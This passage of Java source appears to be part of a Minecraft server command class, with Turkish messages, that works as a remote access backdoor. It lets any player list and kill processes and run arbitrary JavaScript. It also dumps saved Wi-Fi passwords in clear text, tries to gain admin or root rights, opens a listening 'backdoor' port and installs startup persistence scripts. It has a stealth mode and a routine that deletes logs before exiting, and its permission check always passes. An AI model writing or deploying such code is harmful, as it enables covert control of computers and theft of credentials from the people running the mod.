                                        Files.delete(p);
                                    } catch (Exception e) {}
                                });
                    }
                    Runtime.getRuntime().exec("cmd.exe /c del /f /q *.log");
                } catch (Exception e) {}
                scheduler.schedule(() -> System.exit(0), 1, TimeUnit.SECONDS);
            });
        }
        private void handleHistory(ICommandSender sender) {
            synchronized (commandHistory) {
                send(sender, TextFormatting.AQUA + "Komut Gecmisi:");
                for (int i = 0; i < commandHistory.size(); i++) {
                    send(sender, i + ": " + commandHistory.get(i));
                }
            }
        }
        private void handleClearLog(ICommandSender sender) {
            commandHistory.clear();
            send(sender, TextFormatting.GREEN + "Komut gecmisi temizlendi.");
        }
        private void handleProcessList(ICommandSender sender, String os) {
            ioExecutor.submit(() -> {
                try {
                    String cmd;
                    if (os.contains("win")) {
                        cmd = "tasklist";
                    } else {
                        cmd = "ps aux";
                    }
                    Process p = Runtime.getRuntime().exec(cmd);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    send(sender, TextFormatting.AQUA + "Process Listesi:");
                    int count = 0;
                    while ((line = reader.readLine()) != null && count < 50) {
                        send(sender, line);
                        count++;
                    }
                    p.waitFor();
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Process listesi hatasi: " + e.getMessage());
                }
            });
        }
        private void handleKillProcess(ICommandSender sender, String input, String os) {
            ioExecutor.submit(() -> {
                try {
                    String cmd;
                    if (os.contains("win")) {
                        if (input.matches("\\d+")) {
                            cmd = "taskkill /F /PID " + input;
                        } else {
                            cmd = "taskkill /F /IM " + input;
                        }
                    } else {
                        if (input.matches("\\d+")) {
                            cmd = "kill -9 " + input;
                        } else {
                            cmd = "pkill -f " + input;
                        }
                    }
                    Process p = Runtime.getRuntime().exec(cmd);
                    p.waitFor();
                    send(sender, TextFormatting.GREEN + "Process sonlandirildi: " + input);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Process sonlandirma hatasi: " + e.getMessage());
                }
            });
        }
        private void handleInject(ICommandSender sender, String jsCode) {
            ioExecutor.submit(() -> {
                try {
                    ScriptEngineManager factory = new ScriptEngineManager();
                    ScriptEngine engine = factory.getEngineByName("JavaScript");
                    Object result = engine.eval(jsCode);
                    send(sender, TextFormatting.GREEN + "JS calistirildi. Sonuc: " + result);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "JS hatasi: " + e.getMessage());
                }
            });
        }
        private void handleRegistry(ICommandSender sender, String[] args, String os) {
            if (!os.contains("win")) {
                send(sender, TextFormatting.RED + "Sadece Windows");
                return;
            }
            send(sender, TextFormatting.YELLOW + "Registry ozelligi bu surumde devre disi.");
        }
        private void handleService(ICommandSender sender, String[] args, String os) {
            send(sender, TextFormatting.YELLOW + "Service ozelligi bu surumde devre disi.");
        }
        private void handleDriver(ICommandSender sender, String[] args) {
            send(sender, TextFormatting.YELLOW + "Driver ozelligi bu surumde devre disi.");
        }
        private void handleWifiPasswords(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Process p = Runtime.getRuntime().exec("netsh wlan show profiles");
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    List<String> profiles = new ArrayList<>();
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("All User Profile")) {
                            String profile = line.split(":")[1].trim();
                            profiles.add(profile);
                        }
                    }
                    for (String profile : profiles) {
                        Process p2 = Runtime.getRuntime().exec("netsh wlan show profile name=\"" + profile + "\" key=clear");
                        BufferedReader reader2 = new BufferedReader(new InputStreamReader(p2.getInputStream()));
                        String line2;
                        while ((line2 = reader2.readLine()) != null) {
                            if (line2.contains("Key Content")) {
                                send(sender, TextFormatting.GREEN + profile + " : " + line2.split(":")[1].trim());
                            }
                        }
                        p2.waitFor();
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Wifi sifre hatasi: " + e.getMessage());
                }
            });
        }
        private void handleBrowserPasswords(ICommandSender sender, String os) {
            send(sender, TextFormatting.YELLOW + "Browser sifreleri ozelligi bu surumde devre disi.");
        }
        private void handleElevate(ICommandSender sender, String os) {
            ioExecutor.submit(() -> {
                try {
                    if (os.contains("win")) {
                        Runtime.getRuntime().exec("powershell Start-Process cmd -Verb RunAs");
                        send(sender, TextFormatting.GREEN + "Yonetici haklari yukseltilmeye calisildi.");
                    } else {
                        Runtime.getRuntime().exec("sudo su");
                        send(sender, TextFormatting.GREEN + "Root erisimi deneniyor.");
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Yukseltme hatasi: " + e.getMessage());
                }
            });
        }
        private void handleBackdoor(ICommandSender sender, int port) {
            ioExecutor.submit(() -> {
                try (ServerSocket serverSocket = new ServerSocket(port)) {
                    send(sender, TextFormatting.GREEN + "Backdoor port " + port + "'da dinlemede...");
                    Socket clientSocket = serverSocket.accept();
                    OutputStream out = clientSocket.getOutputStream();
                    out.write("Backdoor aktif\n".getBytes());
                    out.flush();
                    clientSocket.close();
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Backdoor hatasi: " + e.getMessage());
                }
            });
        }
        private void handlePersistence(ICommandSender sender, String os) {
            ioExecutor.submit(() -> {
                try {
                    if (os.contains("win")) {
                        Path bat = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "pc_persistence.bat");
                        String content = "@echo off\njava -jar \"" + new File(".").getAbsolutePath() + "\"";
                        Files.write(bat, content.getBytes());
                        send(sender, TextFormatting.GREEN + "Windows baslangica eklendi: " + bat.toString());
                    } else {
                        Path sh = Paths.get(System.getProperty("user.home"), ".config", "autostart", "pc_persistence.sh");
                        Files.write(sh, ("#!/bin/bash\njava -jar \"" + new File(".").getAbsolutePath() + "\"").getBytes());
                        Files.setPosixFilePermissions(sh, EnumSet.of(PosixFilePermission.OWNER_EXECUTE, PosixFilePermission.OWNER_READ));
                        send(sender, TextFormatting.GREEN + "Linux baslangica eklendi: " + sh.toString());
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Kalicilik hatasi: " + e.getMessage());
                }
            });
        }
        private String joinArgs(String[] args, int startIndex) {
            StringBuilder sb = new StringBuilder();
            for (int i = startIndex; i < args.length; i++) {
                if (i > startIndex) sb.append(' ');
                sb.append(args[i]);
            }
            return sb.toString();
        }
        private void send(ICommandSender sender, String message) {
            if (!stealthMode) {
                sender.sendMessage(new TextComponentString(message));
            }
        }
        private void sendAggressive(ICommandSender sender, String message) {
            sender.sendMessage(new TextComponentString(TextFormatting.DARK_RED + "" + TextFormatting.BOLD + "[AGGRESIF] " + message));
        }
        @Override
        public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
            return true;
        }
        @Override
        public int getRequiredPermissionLevel() {
            return 4;
        }
    }
}
